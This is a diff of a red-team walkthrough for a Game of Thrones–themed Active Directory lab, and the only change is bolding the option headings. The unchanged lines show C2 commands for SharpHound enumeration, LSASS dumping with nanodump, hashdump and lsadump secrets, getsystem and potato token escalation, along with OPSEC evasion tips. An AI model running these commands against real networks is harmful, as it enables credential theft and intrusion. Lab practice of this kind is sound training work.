@@ -387,13 +387,13 @@ bloodhound-python -d north.sevenkingdoms.local -u 'samwell.tarly' -p 'Heartsbane
 
 **C2 Command (from castelblack agent):**
 
-Option A - In-memory SharpHound via execute-assembly (bad OPSEC): This runs inline, but it loads the .NET CLR into the agent process. The CLR cannot be unloaded after execution. Defenders can detect its presence for the remainder of the process lifetime.
+**Option A - In-memory SharpHound via execute-assembly (bad OPSEC):** This runs inline, but it loads the .NET CLR into the agent process. The CLR cannot be unloaded after execution. Defenders can detect its presence for the remainder of the process lifetime.
 
 ```
 execute-assembly /path/to/SharpHound.exe -c Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs --Throttle 3000 --Jitter 50
 ```
 
-Option B - BOF-based ldapsearch enumeration (lower signature):
+**Option B - BOF-based ldapsearch enumeration (lower signature):**
 
 ```shell
 # User enumeration
@@ -597,7 +597,7 @@ sekurlsa::logonpasswords
 
 **C2 Command (from castelblack agent):**
 
-Option A - nanodump BOF (requires SYSTEM, touches LSASS, bad OPSEC):
+**Option A - nanodump BOF (requires SYSTEM, touches LSASS, bad OPSEC):**
 
 ```
 nanodump -sc --valid -w C:\Windows\Temp\debug.log
@@ -635,7 +635,7 @@ Clean up the dump file:
 fs rm C:\Windows\Temp\debug.log
 ```
 
-Option B - hashdump BOF (recommended, runs as `jeor.mormont`, SAM hive, local accounts only):
+**Option B - hashdump BOF (recommended, runs as `jeor.mormont`, SAM hive, local accounts only):**
 
 ```
 hashdump
@@ -643,7 +643,7 @@ hashdump
 
 ![](image/red-team-workflow/20260921182208.png)
 
-Option C running as SYSTEM - lsadump BOFs:
+**Option C running as SYSTEM - lsadump BOFs:**
 
 ```
 lsadump_secrets
@@ -878,7 +878,7 @@ event.code:"1" AND process.name:"net.exe" AND process.command_line:*localgroup* 
 
 After GPO abuse adds samwell.tarly to local Administrators, or after obtaining jeor.mormont credentials (who is already a local admin on castelblack), escalate to SYSTEM:
 
-Option A - getsystem BOF (recommended):
+**Option A - getsystem BOF (recommended):**
 
 ```
 token revert
@@ -890,7 +890,7 @@ getsystem token
 
 This elevates the current agent to SYSTEM and gains TrustedInstaller group privilege through impersonation.
 
-Option B - Potato BOFs (if only SeImpersonate privilege is available):
+**Option B - Potato BOFs (if only SeImpersonate privilege is available):**
 
 ```
 potato-dcom --token
